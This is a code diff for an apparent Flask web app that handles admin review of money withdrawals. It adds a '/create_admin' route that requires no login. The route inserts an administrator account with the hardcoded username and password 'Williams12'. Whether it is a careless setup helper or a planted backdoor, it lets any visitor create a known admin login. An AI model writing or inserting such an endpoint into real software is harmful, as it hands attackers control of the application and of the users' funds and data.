@@ -1811,6 +1811,54 @@ def reject_withdraw(id):
     return redirect(
         "/admin/withdrawals"
     )
+@app.route("/create_admin")
+def create_admin():
+
+    conn = get_db()
+    cur = conn.cursor()
+
+    from werkzeug.security import generate_password_hash
+
+    username = "Williams12"
+    password = "Williams12"
+
+    hashed = generate_password_hash(password)
+
+    cur.execute(
+        """
+        SELECT id FROM admins
+        WHERE username=%s
+        """,
+        (username,)
+    )
+
+    existing = cur.fetchone()
+
+    if not existing:
+
+        cur.execute(
+            """
+            INSERT INTO admins
+            (username, password)
+            VALUES (%s,%s)
+            """,
+            (
+                username,
+                hashed
+            )
+        )
+
+        conn.commit()
+
+        message = "Admin created successfully"
+
+    else:
+        message = "Admin already exists"
+
+
+    conn.close()
+
+    return message
 # =====================================
 # ADMIN LOGIN
 # =====================================
